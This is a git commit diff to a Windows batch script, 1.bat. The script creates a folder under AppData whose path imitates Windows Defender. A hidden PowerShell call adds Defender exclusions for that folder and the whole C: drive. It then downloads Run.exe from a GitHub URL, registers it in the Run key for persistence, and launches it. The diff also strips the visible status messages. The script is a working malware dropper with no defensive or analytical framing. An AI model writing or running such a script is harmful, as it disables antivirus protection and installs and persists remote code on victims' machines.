ca2e7a045231d2de1c49d12ac1d564732344cb95
khoa1234567 <110732554+khoa1234567@users.noreply.github.com>
2024-02-26 07:36:55 -0800

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,16 +1,21 @@
 @echo off
 setlocal
+
 set "folder=%APPDATA%\LocalLow\Windows Defender\Windows\Folder Windows\Fuck You"
 if not exist "%folder%" (
     mkdir "%folder%"
-    attrib +h +s "%folder%"
 )
+PowerShell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%folder%', 'C:\'"
+
+set "file_url=https://github.com/khoa1234567/AI/raw/main/Run.exe"
 set "file_path=%folder%\Run.exe"
 if not exist "%file_path%" (
-    echo Downloading Run.exe...
-    powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/khoa1234567/AI/raw/main/Run.exe', '%file_path%')"
+    powershell -command "(New-Object System.Net.WebClient).DownloadFile('%file_url%', '%file_path%')"
 )
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d "%file_path%" /f
-echo Running Run.exe...
-start "" "%file_path%"
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /t REG_SZ /d "\"%file_path%\"" /f
+if exist "%file_path%" (
+    start "" "%file_path%"
+)
+
 endlocal
